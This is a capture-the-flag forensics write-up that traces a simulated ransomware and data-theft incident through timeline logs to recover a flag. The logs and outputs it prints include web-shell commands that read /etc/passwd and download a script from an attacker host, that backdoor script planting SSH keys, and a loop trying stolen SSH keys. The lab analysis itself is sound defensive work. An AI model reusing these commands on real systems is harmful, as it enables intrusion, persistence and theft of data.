# Threatening message (4 points)

Hi, emergency troubleshooter,

hurry to the SSD (Support Services Department) – they’ve received a threatening
e-mail, probably from a recently dismissed employee. It threatens both the loss
and the disclosure of our organization’s data. The situation needs to be
investigated.

Stay grounded!

* [Download threatening message](https://github.com/jandurovec/the-catch-2025/raw/refs/heads/main/threatening-message/threatening_message.zip)
* [Download materials for analysis](https://github.com/jandurovec/the-catch-2025/raw/refs/heads/main/threatening-message/image.zip)

## Hints

* Beware! You may face the real malware in this challenge.

## Solution

Let's start by extracting the archive. The text message states that our
documents have been encrypted and exfiltrated

```text
    ____  ____  ____________________  __  _______
   / __ \/ __ \/ ____/ ____/  _/ __ \/ / / / ___/
  / /_/ / /_/ / __/ / /    / // / / / / / /\__ \
 / ____/ _, _/ /___/ /____/ // /_/ / /_/ /___/ /
/_/   /_/ |_/_____/\____/___/\____/\____//____/

    ____________    ___________
   / ____/  _/ /   / ____/ ___/
  / /_   / // /   / __/  \__ \
 / __/ _/ // /___/ /___ ___/ /
/_/   /___/_____/_____//____/


--- YOUR FILES ARE ENCRYPTED AND EXFILTRATED ---

All of your important data has been encrypted with a strong encryption algorithm.
We have also copied this data to our secure server.

If you want to:
  • Restore access to your files
  • Prevent your sensitive information from being published

You must follow our instructions.

1. Do not attempt to restore or modify the files yourself — you will damage them.
2. Contact us at: 555 127 987 259 (from 08:00 to 16:30 CEST, we speak English, German, French, Portuguese and Slovak)
3. Your unique ID: X1F9-28AA-91BC
4. Payment must be made within 64 days to avoid data release.

Failure to comply will result in your files being permanently lost and your private data being made public.

Time is ticking. Tick-tock, tick-tock, tick-tock, ...

--- YOUR FILES ARE ENCRYPTED AND EXFILTRATED ---
```

The materials for analysis contain `image.plaso`. There probably is some fancy
viewer for this format allowing all the things we're going to do more
efficiently, but we can also use `plaso-psort` from Plaso tools to convert it
to CSV format and "process" it using `grep` etc.

```
$ plaso-psort -o l2tcsv -w timeline.csv image.plaso
```

Since the message says that our files have been encrypted, we may try to search
for anything "encryption" related in our file.

```
$ grep -i encrypt timeline.csv
(... output truncated ...)
08/25/2025,13:30:34,UTC,M...,LOG,Log File,Content Modification Time,-,3768c3b2a3b1,[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=...,[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/home/doublepower/sc encrypt /srv/shared /home/doublepower/enc,2,EXT:/var/log/auth.log,22062,-,text/syslog,sha256_hash: 2bfb2cb06f16f7d53c3d1c8c6e188d15a7976d9b291ef7fe15fed0e9e6ccde0c
(... output truncated ...)
```

We can see that `doublepower` user executed `/home/doublepower/sc encrypt /srv/shared /home/doublepower/enc`
command using `sudo` as `root`. We can check what else was executed as `root`.

```
$ grep "root ; COMMAND=" timeline.csv | cut -d, -f11
[sudo] powerguy : TTY=pts/0 ; PWD=/home/powerguy ; USER=root ; COMMAND=/usr/bin/su
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/passwd powergrid
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/passwd powerguy
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/sed -i 's/^#*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/bin/sed -i 's/^#*UsePAM.*/UsePAM no/' /etc/ssh/sshd_config
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/sbin/service ssh restart
[sudo] powergrid : TTY=pts/0 ; PWD=/home/powergrid ; USER=root ; COMMAND=/usr/sbin/usermod -L powerguy
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/home/doublepower/sc encrypt /srv/shared /home/doublepower/enc
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/tar -czf /home/doublepower/shared.tar.gz /srv/shared
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/chown doublepower:doublepower /home/doublepower/shared.tar.gz
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/cp /home/doublepower/read.me /home/powergrid/read.me
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/chmod 777 /home/powergrid/read.me
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/cp /home/doublepower/read.me /srv/shared/read.me
[sudo] doublepower : TTY=pts/0 ; PWD=/home/doublepower ; USER=root ; COMMAND=/usr/bin/chmod 777 /srv/shared/read.me
```

This starts to paint a picture. We can see `powergrid` user disabling all
access except SSH key-based one and locking out `powerguy` user account.

We can also see that encryption procedure probably created `shared.tar.gz`, so
we can check what happened to it or whether someone has worked with it.

```
$ grep -A6 shared\.tar\.gz timeline.csv
(... output truncated ...)
08/25/2025,13:30:51,UTC,.A..,FILE,Bodyfile,Last Access Time,-,-,/home/doublepower/shared.tar.gz,/home/doublepower/shared.tar.gz Owner identifier: 1002 Group identifier: 1002 Mode: -rw-r--r-- MD5: 52b3bf73e3d9b52bca61196cbdfce081,2,OS:/data/container_app_new.mac,4092351,-,bodyfile,sha256_hash: e95b1b5ad836165d2a3c326096c9ee8954b25f00f84f4dd57c765d4eed9858a1; size: 63555; symbolic_link_target:
08/25/2025,13:30:51,UTC,M.C.,FILE,Bodyfile,Content Modification Time; Metadata Modification Time,-,-,/home/doublepower/.ssh,/home/doublepower/.ssh Owner identifier: 1002 Group identifier: 1002 Mode: drwx------,2,OS:/data/container_app_new.mac,4092332,-,bodyfile,sha256_hash: e95b1b5ad836165d2a3c326096c9ee8954b25f00f84f4dd57c765d4eed9858a1; size: 4096; symbolic_link_target:
08/25/2025,13:30:51,UTC,.A..,FILE,Bodyfile,Last Access Time,-,-,/home/doublepower/rsa,/home/doublepower/rsa Owner identifier: 1002 Group identifier: 1002 Mode: -rw------- MD5: b5d26273af2c20c43b2df865380b5266,2,OS:/data/container_app_new.mac,4092350,-,bodyfile,sha256_hash: e95b1b5ad836165d2a3c326096c9ee8954b25f00f84f4dd57c765d4eed9858a1; size: 3381; symbolic_link_target:
08/25/2025,13:30:51,UTC,M...,LOG,Log File,Content Modification Time,-,router.powergrid.tcc,[nfdump] FLOW TCP 2001:db8:7cc::25:252 34934 -> 2001:db8:7cc::25:29 22 Packet...,[nfdump] FLOW TCP 2001:db8:7cc::25:252 34934 -> 2001:db8:7cc::25:29 22 Packets=37 Bytes=70304 Duration=0.419,2,OS:/data/nfdata.log,-,-,text/syslog_traditional,sha256_hash: 42e47bcb97d936ee7b7601737c8a41dd60ac5f77daa1c77cb87dcf302083e88b
08/25/2025,13:30:51,UTC,MACB,FILE,Bodyfile,Content Modification Time; Creation Time; Last Access Time; Metadata Modification Time,-,-,/home/doublepower/.ssh/known_hosts,/home/doublepower/.ssh/known_hosts Owner identifier: 1002 Group identifier: 1002 Mode: -rw-r--r-- MD5: 91486f4fb655e1245a43403e4bd24597,2,OS:/data/container_app_new.mac,4092352,-,bodyfile,sha256_hash: e95b1b5ad836165d2a3c326096c9ee8954b25f00f84f4dd57c765d4eed9858a1; size: 142; symbolic_link_target:
08/25/2025,13:30:51,UTC,.A..,FILE,Bodyfile,Last Access Time,-,-,/home/doublepower,/home/doublepower Owner identifier: 1002 Group identifier: 1002 Mode: drwxr-xr-x,2,OS:/data/container_app_new.mac,4092268,-,bodyfile,sha256_hash: e95b1b5ad836165d2a3c326096c9ee8954b25f00f84f4dd57c765d4eed9858a1; size: 4096; symbolic_link_target:
08/25/2025,13:30:51,UTC,M...,LOG,Log File,Content Modification Time,-,router.powergrid.tcc,[nfdump] FLOW TCP 2001:db8:7cc::25:29 22 -> 2001:db8:7cc::25:252 34934 Packet...,[nfdump] FLOW TCP 2001:db8:7cc::25:29 22 -> 2001:db8:7cc::25:252 34934 Packets=28 Bytes=6260 Duration=0.419,2,OS:/data/nfdata.log,-,-,text/syslog_traditional,sha256_hash: 42e47bcb97d936ee7b7601737c8a41dd60ac5f77daa1c77cb87dcf302083e88b
```

We can see that at the same time, `shared.tar.gz` was accessed
(`08/25/2025,13:30:51`), `/home/doublepower/.ssh` directory has been modified
and `/home/doublepower/rsa` file was also accessed, followed by a TCP flow to
`2001:db8:7cc::25:29` on port `22`, which indicates, that this file has been
transferred to `2001:db8:7cc::25:29` over SSH connection.

If we analyze the `Apache Access` logs, we can also see some interesting things.

```
$ grep "Apache Access" timeline.csv  | cut -d, -f11 | sort | uniq -c

      1 http_request: GET /get_user_by__iid?q=cat%20/etc/passwd HTTP/1.1 from: 10.99.25.28 code: 200 user_agent: curl/7.88.1
      1 http_request: GET /get_user_by__iid?q=curl%20-h HTTP/1.1 from: 2001:db8:7cc::25:28 code: 200 user_agent: curl/7.88.1
      1 http_request: GET /get_user_by__iid?q=curl%20http%3A%2F%2F%5B2001%3Adb8%3A7cc%3A%3A25%3A28%5D%2Fmy%2Fbackup2%20-o%20%2Ftmp%2Fbackup.sh HTTP/1.1 from: 2001:db8:7cc::25:28 code: 200 user_agent: curl/7.88.1
      1 http_request: GET /get_user_by__iid?q=whoami HTTP/1.1 from: 10.99.25.28 code: 200 user_agent: curl/7.88.1
    408 http_request: POST /data HTTP/1.1 from: 10.99.25.23 code: 200 user_agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/127.0.0.0 Safari/537.36
    408 http_request: POST /data HTTP/1.1 from: 10.99.25.24 code: 200 user_agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
    409 http_request: POST /data HTTP/1.1 from: 2001:db8:7cc::25:26 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/127.0.0.0 Safari/537.36
    409 http_request: POST /data HTTP/1.1 from: 2001:db8:7cc::25:27 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/137.0
```

We can see hundreds of `POST` requests to `/data` from 4 IP addresses, however,
it is `GET /get_user_by__iid` that looks more interesting. It looks very much
like a web shell, executing whatever is sent as the `q` parameter. The third
request executes `curl http://[2001:db8:7cc::25:28]/my/backup2 -o /tmp/backup.sh`.
Let's see if this script is still available.

```
$ curl -s http://[2001:db8:7cc::25:28]/my/backup2
#!/bin/bash

mkdir -p /home/doublepower/.ssh
chown doublepower:doublepower /home/doublepower/.ssh
chmod 700 /home/doublepower/.ssh

curl http://[2001:db8:7cc::25:28]/my/authorized_keys -o /home/doublepower/.ssh/authorized_keys
chown doublepower:doublepower /home/doublepower/.ssh/authorized_keys
chmod 600 /home/doublepower/.ssh/authorized_keys
```

This script, if executed under the correct user, would enable someone from
outside to log in as `doublepower` using a known SSH key. Let's use `dirb`
to see what else we can find on that server.

```
$ dirb http://[2001:db8:7cc::25:28]

-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://[2001:db8:7cc::25:28]/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://[2001:db8:7cc::25:28]/ ----
==> DIRECTORY: http://[2001:db8:7cc::25:28]/current/
+ http://[2001:db8:7cc::25:28]/index.html (CODE:200|SIZE:329)
==> DIRECTORY: http://[2001:db8:7cc::25:28]/keys/
==> DIRECTORY: http://[2001:db8:7cc::25:28]/my/
==> DIRECTORY: http://[2001:db8:7cc::25:28]/ssh/
==> DIRECTORY: http://[2001:db8:7cc::25:28]/tools/

---- Entering directory: http://[2001:db8:7cc::25:28]/current/ ----

---- Entering directory: http://[2001:db8:7cc::25:28]/keys/ ----

---- Entering directory: http://[2001:db8:7cc::25:28]/my/ ----
+ http://[2001:db8:7cc::25:28]/my/authorized_keys (CODE:200|SIZE:754)
+ http://[2001:db8:7cc::25:28]/my/backup2 (CODE:200|SIZE:345)

---- Entering directory: http://[2001:db8:7cc::25:28]/ssh/ ----

---- Entering directory: http://[2001:db8:7cc::25:28]/tools/ ----
+ http://[2001:db8:7cc::25:28]/tools/sc (CODE:200|SIZE:11960160)

-----------------
DOWNLOADED: 27672 - FOUND: 4
```

The script discovered a `/keys` directory containing many keys, likely
used for encrypting/decrypting victims' data. The `/ssh` directory contains 16
SSH key pairs. Let's download all of them, e.g. like this

```
$ mkdir keys ssh
$ curl -s http://[2001:db8:7cc::25:28]/keys/ | grep -o 'href="[^"]*"' | grep -v "\.\./" | sed 's/href="\(.*\)"/\1/' | while read f; do curl -s "http://[2001:db8:7cc::25:28]/keys/$f" -o keys/$f; done
$ curl -s http://[2001:db8:7cc::25:28]/ssh/ | grep -o 'href="[^"]*"' | grep -v "\.\./" | sed 's/href="\(.*\)"/\1/' | while read f; do curl -s "http://[2001:db8:7cc::25:28]/ssh/$f" -o ssh/$f; done
```

We can also see `http://[2001:db8:7cc::25:28]/tools/sc`. Based on our previous
analysis, we already know that the `sc` tool was used to encrypt the data. We
can download this binary for later analysis too.

Exploring public SSH keys indicates that the usernames range from
`01@fearme.tcc` up to `16@fearme.tcc`.

We can try to iteratively use the 16 downloaded SSH keys to log in to the host
where we suspect our data has disappeared.

```
$ for n in `seq -w 1 16`; do ssh -l $n -i ssh/id_doublepower_$n 2001:db8:7cc::25:29; done
01@2001:db8:7cc::25:29: Permission denied (publickey).
02@2001:db8:7cc::25:29: Permission denied (publickey).
03@2001:db8:7cc::25:29: Permission denied (publickey).
04@2001:db8:7cc::25:29: Permission denied (publickey).
05@2001:db8:7cc::25:29: Permission denied (publickey).
06@2001:db8:7cc::25:29: Permission denied (publickey).
07@2001:db8:7cc::25:29: Permission denied (publickey).
08@2001:db8:7cc::25:29: Permission denied (publickey).
09@2001:db8:7cc::25:29: Permission denied (publickey).
10@2001:db8:7cc::25:29: Permission denied (publickey).
$ ls -la
total 88
drwx------ 1 11   11    4096 Aug 27 13:15 .
drwxr-xr-x 1 root root  4096 Aug 27 13:15 ..
-rw------- 1 11   11     220 Apr 18  2025 .bash_logout
-rw------- 1 11   11    3526 Apr 18  2025 .bashrc
-rw------- 1 11   11     807 Apr 18  2025 .profile
drwx------ 1 11   11    4096 Aug 27 13:15 .ssh
-rw------- 1 11   11   63555 Aug 27 13:15 shared.tar.gz
```

As we can see, the 11th key worked and the server does have our data. We can
now retrieve it.

```
$ scp -i id_doublepower_11 11@[2001:db8:7cc::25:29]:shared.tar.gz .
$ tar tzvf shared.tar.gz
drwxrwx--- powergrid/powergrid 0 2025-08-14 11:24 srv/shared/
drwxrwx--- powergrid/powergrid 0 2025-08-25 15:30 srv/shared/psy-ops/
-rw-r--r-- root/root        5748 2025-08-25 15:30 srv/shared/psy-ops/morale_boosting.md.enc
-rw-r--r-- root/root       36827 2025-08-25 15:30 srv/shared/psy-ops/pill.jpg.enc
drwxrwx--- powergrid/powergrid 0 2025-08-25 15:30 srv/shared/grid-ops/
-rw-r--r-- root/root        3861 2025-08-25 15:30 srv/shared/grid-ops/repair_log.md.enc
-rw-r--r-- root/root        2223 2025-08-25 15:30 srv/shared/grid-ops/field_notebook542.md.enc
drwxrwx--- powergrid/powergrid 0 2025-08-25 15:30 srv/shared/other/
-rw-r--r-- root/root        6895 2025-08-25 15:30 srv/shared/other/powerplant_10_yr_stats.md.enc
-rw-r--r-- root/root        1780 2025-08-25 15:30 srv/shared/other/powerplant_selfdestruction.csv.enc
drwxrwx--- powergrid/powergrid 0 2025-08-25 15:30 srv/shared/sci-ops/
-rw-r--r-- root/root        2801 2025-08-25 15:30 srv/shared/sci-ops/flabvolt.md.enc
-rw-r--r-- root/root        2508 2025-08-25 15:30 srv/shared/sci-ops/seismovolt.md.enc
```

We have successfully retrieved the data; however, it is encrypted. This is
where the warning/hint becomes important. We can either try to decompile and
analyze it, or run it in a sandboxed environment (ideally on a separate
host/VM, with no access to network and/or the real filesystem, since we're
dealing with ransomware that encrypts data).

_Note: Surely the authors of The Catch would not want to be responsible for any
damages caused, so we can perhaps assume that this time, it is safe. :smiling_imp:_

Let's spin up a new sandboxed environment (`firejail`, `Docker`, ...) and see
what it does.

```
$ ./sc
usage: sc [-h] {encrypt,decrypt} directory key
sc: error: the following arguments are required: mode, directory, key
```

Great! It seems that not only can it encrypt the data, it can also be used for
decryption. Since we already have the key candidates, we can try each one to
see which decrypts the data.

```
$ for k in `ls keys/*pem`; do if ./sc decrypt srv $k 2>/dev/null; then echo "Success with $k"; break; else echo "$k is not the one"; fi; done
keys/key_100067821798.pem is not the one
keys/key_100184838173.pem is not the one
keys/key_101521682059.pem is not the one
(... output truncated ...)
keys/key_137747924982.pem is not the one
keys/key_138601947239.pem is not the one
keys/key_140141545366.pem is not the one
[+] Decrypted: srv/shared/psy-ops/pill.jpg.enc
[+] Decrypted: srv/shared/psy-ops/morale_boosting.md.enc
[+] Decrypted: srv/shared/other/powerplant_10_yr_stats.md.enc
[+] Decrypted: srv/shared/other/powerplant_selfdestruction.csv.enc
[+] Decrypted: srv/shared/sci-ops/seismovolt.md.enc
[+] Decrypted: srv/shared/sci-ops/flabvolt.md.enc
[+] Decrypted: srv/shared/grid-ops/field_notebook542.md.enc
[+] Decrypted: srv/shared/grid-ops/repair_log.md.enc
Success with keys/key_140261531202.pem
```

With the `srv` files decrypted, we can explore the content and come across
`srv/shared/other/powerplant_selfdestruction.csv`, which looks as follows:

```
$ cat srv/shared/other/powerplant_selfdestruction.csv
Facility,Right SD operator,Left SD operator
Riverbend Hydro,dk1MLUN5Y1EtT2hDcH0=,QkFEQUJPT017clFGZy0z
Granite Peak Nuclear,TFRTLWJLbkItMDcwVH0=,QkFEQUJPT017bVNBVC1l
Sunnyvale Solar Farm,MGNXLTBaMU8tQk44M30=,QkFEQUJPT017dFpVcy1u
Windy Plains Windpark,clk2LWZFV24tOVNSMX0=,QkFEQUJPT017Q2ZaSC1J
Ironclad Coal Plant,d01GLVhRN3ctYjdpOH0=,QkFEQUJPT017SEp3Qi13
Bluewave Tidal,dXBVLTFDeXQtU2puan0=,QkFEQUJPT017WU5RMy13
Mountainview Nuclear,RGxMLTFtTFUtRUdYan0=,QkFEQUJPT017TWduWi04
Greenfield Biomass,NE56LThFYUwtdTVoM30=,QkFEQUJPT017a2dkby16
Starlight Solar,TU9SLXhTa08tbGd6bH0=,QkFEQUJPT017dFI0TC1t
Thunderbolt Hydro,MzljLWlPV3AtNlNJYn0=,QkFEQUJPT017cHVpSC1n
Coalridge Thermal,RVg5LWtzVEIteUoxZH0=,QkFEQUJPT017ODdVTC16
Northwind Windpark,V3J2LWxUNUstMzBpaX0=,QkFEQUJPT017cXRXbi1q
Horizon Nuclear,dGJVLVNmUmEtUWxKQ30=,QkFEQUZMQUd7bUtlay1F
Desert Sun Solar,YmhkLXgxOVgtTFNEQ30=,QkFEQUJPT017ZDgyRC1L
Rivermill Hydro,Qk1nLVEwMzctaVZSNn0=,QkFEQUJPT017Z3NvMC1Z
Blackrock Coal,SktYLXZTdUwtQzFBVX0=,QkFEQUJPT017VW5KSy1R
Oceanwave Tidal,bFNKLWxCTmItU1VKVn0=,QkFEQUJPT017WE5yRS1V
Forestview Biomass,QjMwLVFaUHQtQjhDRH0=,QkFEQUJPT017Z21Tay10
Skylight Solar,ZmZLLTFWU2QtNGMzUn0=,QkFEQUJPT017bmlKdi1n
Rapidfall Hydro,M2xCLWZHeVktWmFzYn0=,QkFEQUJPT017YU9kdi11
Ember Coal Plant,ak1VLXY4M2UtWmFhWX0=,QkFEQUJPT017YlE4Vy1w
Windcrest Windpark,cWNtLTYwcHctcjZYMX0=,QkFEQUJPT017SDlrTS1I
Aurora Nuclear,eUlaLWdSM1AtdFJJVn0=,QkFEQUJPT017RlJDWi1H
Sunridge Solar Farm,OWdtLTEzWTYta2ZTVn0=,QkFEQUJPT017R2p4eS1Y
```

The columns look like two halves of a base64-encoded message, with the first
half in the last column and the second half in the second column.

The last step is to simply reorder and decode (with a small twist of making
sure that the text file uses UNIX EOL before processing it with `awk`).

```
$ dos2unix srv/shared/other/powerplant_selfdestruction.csv
dos2unix: converting file srv/shared/other/powerplant_selfdestruction.csv to Unix format...

$ awk -F, '{print $3 $2}' srv/shared/other/powerplant_selfdestruction.csv | tail -n +2 | base64 -d | grep -io "flag{[^}]*}"
FLAG{mKek-EtbU-SfRa-QlJC}
```
